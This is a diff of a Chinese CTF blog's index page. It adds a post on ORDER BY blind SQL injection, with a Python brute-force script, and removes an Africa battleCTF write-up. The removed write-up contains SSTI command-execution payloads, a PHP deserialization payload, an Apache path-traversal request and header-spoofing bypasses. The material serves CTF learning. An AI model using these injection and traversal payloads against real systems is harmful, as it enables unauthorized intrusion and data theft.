@@ -185,6 +185,101 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/02/11/order-by-%E7%9B%B2%E6%B3%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lvzhouhang">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lvzhouhang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/02/11/order-by-%E7%9B%B2%E6%B3%A8/" class="post-title-link" itemprop="url">order by 盲注</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-02-11 19:11:39 / 修改时间：20:14:39" itemprop="dateCreated datePublished" datetime="2024-02-11T19:11:39+08:00">2024-02-11</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>794</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="order-by比较大小盲注"><a href="#order-by比较大小盲注" class="headerlink" title="order by比较大小盲注"></a>order by比较大小盲注</h1><p><img src="/pic/orderby1.png"></p>
+<p>这是表里的所有东西</p>
+<p>如果我们执行<code>select * from flag where id=&#39;&#39; or 1 union select 1,1 order by 2;</code>会出现</p>
+<p><img src="/pic/orderby2.png"></p>
+<p>不能用<code>and</code>否则就相当于创建了一个虚拟的表，查询不到原来的数据。</p>
+<p>我们知道flag的第一位是<code>f</code>，如果我们查询<code>select * from flag where id=&#39;&#39; or 1 union select 1,&#39;f&#39; order by 2;</code>会发生什么呢？</p>
+<p><img src="/pic/orderby3.png"></p>
+<p>还是这样，第一行没什么用，但是如果我们查询的是<code>g</code>的话就会变成这样</p>
+<p><img src="/pic/orderby4.png"></p>
+<p>flag的值就会出现在第一行，我们就可以利用这一点来进行order by盲注</p>
+<p>脚本:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">&quot;http://4ef0329e-10b4-4bd1-bf0a-0d80fe83129d.challenge.ctf.show/&quot;</span></span><br><span class="line"><span class="built_in">str</span>=string.digits+string.ascii_letters</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">j=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;&#x27; or 1 union select 1,2,&#x27;&#123;0&#125;&#x27; order by 3#&quot;</span>.<span class="built_in">format</span>(flag+s),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1111&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;&lt;/code&gt;admin&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(s)-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+
+<p>根据脚本自行修改</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/04/Tiki-1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1256,196 +1351,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/26/Africa-battle-CTF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="lvzhouhang">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="lvzhouhang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/06/26/Africa-battle-CTF/" class="post-title-link" itemprop="url">Africa battle CTF</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-06-26 08:29:04" itemprop="dateCreated datePublished" datetime="2023-06-26T08:29:04+08:00">2023-06-26</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-03-18 17:41:34" itemprop="dateModified" datetime="2024-03-18T17:41:34+08:00">2024-03-18</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf/%E5%A4%8D%E7%9B%98/" itemprop="url" rel="index"><span itemprop="name">复盘</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>6.3k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>6 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Civilization"><a href="#Civilization" class="headerlink" title="Civilization"></a>Civilization</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;./flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ami&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ami&#x27;</span>];</span><br><span class="line">    <span class="variable">$cigar</span> = <span class="string">&#x27;africacradlecivilization&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/<span class="subst">$cigar</span>/&quot;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$input</span>) === <span class="variable">$cigar</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">africa</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;home.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>?source得到这个，这个只用双写就可以绕过。</p>
-<p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ami=africacradlecafricacradlecivilizationivilization</span><br></pre></td></tr></table></figure>
-
-<h2 id="Cobalt-Injection"><a href="#Cobalt-Injection" class="headerlink" title="Cobalt Injection"></a>Cobalt Injection</h2><p>在源代码里有</p>
-<p><code>&lt;!-- IP?capital=Benin --&gt;</code></p>
-<p><img src="/pic/Africa/8085.png"></p>
-<p>可知存在ssti模板注入。没有过滤。</p>
-<p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?capital=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat flag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>当然看别人的WP，要长脑子了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?capital=&#123;&#123;request.application.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>#request.application：表示当前请求的应用程序对象。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?capital=&#123;&#123;().__class__.__base__.__subclasses__()[354](&#x27;cat flag.txt&#x27;, shell=True, stdout=-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这个还没搞明白，搞明白了再回来修改。</p>
-<h2 id="Fa"><a href="#Fa" class="headerlink" title="Fâ"></a>Fâ</h2><p>访问?source</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">africa</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$boknn</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$du</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fa&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$vodoo</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;fa&#x27;</span>];</span><br><span class="line">       </span><br><span class="line">        <span class="variable">$fa</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$vodoo</span>);</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$fa</span>) &#123;</span><br><span class="line">            <span class="variable">$fa</span>-&gt;du=<span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$fa</span>-&gt;du === <span class="variable">$fa</span>-&gt;boknn)</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Congratulation! You&#x27;ve got the best interpretation: &lt;b&gt;&quot;</span>.<span class="variable">$fa</span>-&gt;du.<span class="string">&quot;&lt;/b&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Oh no...&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;you dey smoke igbo?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;home.html&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>反序列化，只要将传入的fa值和$du相等就可以输出flag。</p>
-<p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?fa=O:6:&quot;africa&quot;:2:&#123;s:5:&quot;boknn&quot;;N;s:2:&quot;du&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>其中，boknn的值为NULL，du的值通过R引用了编号为2的值，</p>
-<p><img src="/pic/Africa/8084.png"></p>
-<p>boknn的编号就为2。</p>
-<p>具体的可以看:<a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/php-serialize.html">https://wiki.wgpsec.org/knowledge/ctf/php-serialize.html</a></p>
-<h2 id="Own-reality"><a href="#Own-reality" class="headerlink" title="Own reality"></a>Own reality</h2><p>真是让我长见识了。</p>
-<p>首先是.git泄露</p>
-<p>用wget将网站下载下来</p>
-<p> `wget <a target="_blank" rel="noopener" href="http://chall.battlectf.online:8082/.git/">http://chall.battlectf.online:8082/.git/</a> -mirror</p>
-<p>使用 <code>--mirror</code> 选项你可以下载整个站点，包括它的目录结构。</p>
-<p>然后用git reflog查看历史版本，之后用git cherry-pick ‘你想要恢复的’</p>
-<p>会出来一个flag.txt,尾部有</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.__..._..__...._.___._...___._...__.__...__.._._._....__._._._..._...__..____.__._._._._.__.___..__._.__.__.___..__.____.___.___.__.___.._._____.__..._..__._.._.___._...___..__._._____..__..__..___.....__._...__.._._.__.._._.__...._..__._....___.._.__..._...__._....__..._..__.___.__.._._.__.._._..__.._..__..__..__..__...__._._.__...._..__..._..__..__.__..__..__..._..__.._...__...__.__...__.__...._..__.__..__..__...__..__..__.._...__.___._____._</span><br></pre></td></tr></table></figure>
-
-<p>二进制转换为字符就是flag</p>
-<h2 id="It-shock-you"><a href="#It-shock-you" class="headerlink" title="It shock you"></a>It shock you</h2><p>先用whatweb看网站，</p>
-<p><img src="/pic/Africa%5C8083.1.png"></p>
-<p>可以看到apache的版本，去网上找相对应的漏洞能找到，目录穿越</p>
-<p>POC:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/flag.txt HTTP/1.1</span><br><span class="line">Host: chall.battlectf.online:8083</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=6ae53a7d294917d5fdac2db41c97b477</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-Modified-Since: Tue, 06 Jun 2023 14:53:49 GMT</span><br><span class="line">If-None-Match: &quot;b6d-5fd772fd55940&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="Africa"><a href="#Africa" class="headerlink" title="Africa"></a>Africa</h2><p><code>Warning: This site is only for africa people.</code></p>
-<p>在bp中将<code>User-Agent</code>改为<code>africa</code></p>
-<p><code>     Warning: Go away! Attacker! This page is only for local client!</code></p>
-<p>用<code>X-Forwarded-For</code>伪造127.0.0.1</p>
-<p><code>Warning: I don&#39;t trust users who are not from battlectf.online</code></p>
-<p>用<code>Referer</code>绕过得到flag。</p>
-<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Back-To-Origin"><a href="#Back-To-Origin" class="headerlink" title="Back To Origin"></a>Back To Origin</h2><p>埃及象形文</p>
-<p><a target="_blank" rel="noopener" href="https://girlstart.org/wp-content/uploads/2020/05/Decoding-Hieroglyphics.pdf">https://girlstart.org/wp-content/uploads/2020/05/Decoding-Hieroglyphics.pdf</a></p>
-<p>可以参考上面的链接</p>
-<h2 id="Blind"><a href="#Blind" class="headerlink" title="Blind"></a>Blind</h2><p><a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p>
-<p>首先是<code>magic</code>解码，然后 <code>braille</code>,解码得到flag</p>
-<h2 id="ROCYOU"><a href="#ROCYOU" class="headerlink" title="ROCYOU"></a>ROCYOU</h2><p><code>factordb</code>和<code>yafu</code>分解不出来，看别人的博客知道有<code>ROCA漏洞</code>，可以从公钥中提取私钥</p>
-<p>工具：</p>
-<p><a target="_blank" rel="noopener" href="https://gitlab.com/parfaittolefo23/astuces-et-write-up-ctf/-/blob/main/Tools/neca">https://gitlab.com/parfaittolefo23/astuces-et-write-up-ctf/-/blob/main/Tools/neca</a></p>
-<p>一开始运行要给权限</p>
-<p><img src="/pic/Africa/rock.png"></p>
-<p>可以用在线的rsa解密工具：<a target="_blank" rel="noopener" href="https://www.dcode.fr/chiffre-rsa">https://www.dcode.fr/chiffre-rsa</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p=127801155916875524149457561567678575565270601000365665873572024750823913157383</span><br><span class="line">q=113917064871970833547038329106470040388258358281464605006613652518914797349747</span><br></pre></td></tr></table></figure>
-
-<h2 id="goose"><a href="#goose" class="headerlink" title="goose"></a>goose</h2><p>首先给了5个随机数，然后将falg的每个字符通过<code>res = (2*a*pow(ord(x),4)+b*pow(ord(x),3)+c*pow(ord(x),2)+d*ord(x)+e)</code>进行加密。</p>
-<p>flag的前几个字符是知道的，可以列方程组计算一下a,b,c,d,e的值</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">184473632*a+941192*b+9604*c+98*d+1*e=1245115057305148164</span><br><span class="line">177058562*a+912673*b+9409*c+97*d+1*e=1195140205147730541</span><br><span class="line">362127872*a+1560896*b+13456*c+116*d+1*e=2441940832124642988</span><br><span class="line">362127872*a+1560896*b+13456*c+116*d+1*e=2441940832124642988</span><br><span class="line">272097792*a+1259712*b+11664*c+108*d+1*e=1835524676869638124</span><br><span class="line">208120802*a+1030301*b+10201*c+101*d+1*e=1404473868033353193</span><br></pre></td></tr></table></figure>
-
-<p>解得：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=6709636436</span><br><span class="line">b=7748795321</span><br><span class="line">c=7386429784</span><br><span class="line">d=62359624</span><br><span class="line">e=5008041292</span><br></pre></td></tr></table></figure>
-
-<p>然后写代码爆破:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">a=<span class="number">6709636436</span></span><br><span class="line">b=<span class="number">7748795321</span></span><br><span class="line">c=<span class="number">7386429784</span></span><br><span class="line">d=<span class="number">62359624</span></span><br><span class="line">e=<span class="number">5008041292</span></span><br><span class="line">tab=[<span class="number">1245115057305148164</span>, <span class="number">1195140205147730541</span>, <span class="number">2441940832124642988</span>, <span class="number">2441940832124642988</span>, <span class="number">1835524676869638124</span>, <span class="number">1404473868033353193</span>, <span class="number">272777109172255911</span>, <span class="number">672752034376118188</span>, <span class="number">324890781330979572</span>, <span class="number">3086023531811583439</span>, <span class="number">475309634185807521</span>, <span class="number">1195140205147730541</span>, <span class="number">2441940832124642988</span>, <span class="number">1578661367846445708</span>, <span class="number">2358921859155462327</span>, <span class="number">1099718459319293547</span>, <span class="number">773945458916291731</span>, <span class="number">78288818574073053</span>, <span class="number">2441940832124642988</span>, <span class="number">1578661367846445708</span>, <span class="number">1099718459319293547</span>, <span class="number">343816904985468003</span>, <span class="number">1195140205147730541</span>, <span class="number">2527132076695959961</span>, <span class="number">2358921859155462327</span>, <span class="number">2358921859155462327</span>, <span class="number">1099718459319293547</span>, <span class="number">72109063929756364</span>, <span class="number">2796116718132693772</span>, <span class="number">72109063929756364</span>, <span class="number">2796116718132693772</span>, <span class="number">72109063929756364</span>, <span class="number">2796116718132693772</span>, <span class="number">3291439457645322417</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">2</span>*a*<span class="built_in">pow</span>(<span class="built_in">ord</span>(x),<span class="number">4</span>)+b*<span class="built_in">pow</span>(<span class="built_in">ord</span>(x),<span class="number">3</span>)+c*<span class="built_in">pow</span>(<span class="built_in">ord</span>(x),<span class="number">2</span>)+d*<span class="built_in">ord</span>(x)+e)</span><br><span class="line"><span class="keyword">for</span> val <span class="keyword">in</span> tab:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        <span class="keyword">if</span>(encrypt(<span class="built_in">chr</span>(i))==val):</span><br><span class="line">            flag+=<span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="seyi"><a href="#seyi" class="headerlink" title="seyi"></a>seyi</h2><p>ida64位打开,flag在getshell里面。</p>
-<h2 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h2><p><img src="/pic/Africa/welcome.png"></p>
-<p>重点就是这个，</p>
-<p>add就是加，</p>
-<p>xor就是异或。</p>
-<p>很简单的一个表达式。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">a = <span class="number">0x522D1B20F6</span></span><br><span class="line">b = <span class="number">0x1EE2EEEE</span></span><br><span class="line">c = a+b</span><br><span class="line">d = <span class="number">0x0AA84AAA</span></span><br><span class="line">flag = c^d</span><br><span class="line">flag = long_to_bytes(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
-
-<h2 id="Infinity"><a href="#Infinity" class="headerlink" title="Infinity"></a>Infinity</h2><p><img src="/pic/Africa/in.png"></p>
-<p>找到汇编代码里所有的push，然后将值转换一下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">a=	[p64(<span class="number">0x5F4F7572</span>),</span><br><span class="line">	p64(<span class="number">0x6C654354</span>),</span><br><span class="line">	p64(<span class="number">0x467B4265</span>),</span><br><span class="line">	p64(<span class="number">0x796F6E64</span>),</span><br><span class="line">	p64(<span class="number">0x62617474</span>),</span><br><span class="line">	p64(<span class="number">0x47616C61</span>),</span><br><span class="line">	p64(<span class="number">0x7869657D</span>)]</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> a:</span><br><span class="line">	<span class="built_in">print</span>(c)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;ruO_\x00\x00\x00\x00&#x27;</span><br><span class="line">b&#x27;TCel\x00\x00\x00\x00&#x27;</span><br><span class="line">b&#x27;eB&#123;F\x00\x00\x00\x00&#x27;</span><br><span class="line">b&#x27;dnoy\x00\x00\x00\x00&#x27;</span><br><span class="line">b&#x27;ttab\x00\x00\x00\x00&#x27;</span><br><span class="line">b&#x27;alaG\x00\x00\x00\x00&#x27;</span><br><span class="line">b&#x27;&#125;eix\x00\x00\x00\x00&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>然后将这些反转一下删掉多余的东西</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_Our</span><br><span class="line">leCT</span><br><span class="line">F&#123;Be</span><br><span class="line">batt</span><br><span class="line">Gala</span><br><span class="line">xie&#125;</span><br><span class="line">yond</span><br></pre></td></tr></table></figure>
-
-<p>最后将这些拼接一下，<code>battleCTF&#123;Beyond_OurGalaxie&#125; </code>。</p>
-<h2 id="babyrev"><a href="#babyrev" class="headerlink" title="babyrev"></a>babyrev</h2><p>用ida打开，查询字符串能发现<code>qpiiatRIU&#123;Pvqp_Ugt3_UDDS_Stn_d0D!_85864r1277qu8195pqqtp6540494pr46&#125;</code>，然后凯撒解密得到flag</p>
-<h2 id="checker"><a href="#checker" class="headerlink" title="checker"></a>checker</h2><p>和上一题基本上差不多</p>
-<p><code>gfyyqjHYK&#123;Flg4_d0z_i3d_xr0p3_1lg0?&#125;</code>然后凯撒解密</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1515,7 +1420,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">48</span>
+          <span class="site-state-item-count">49</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1564,12 +1469,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
     </span>
-    <span title="站点总字数">166k</span>
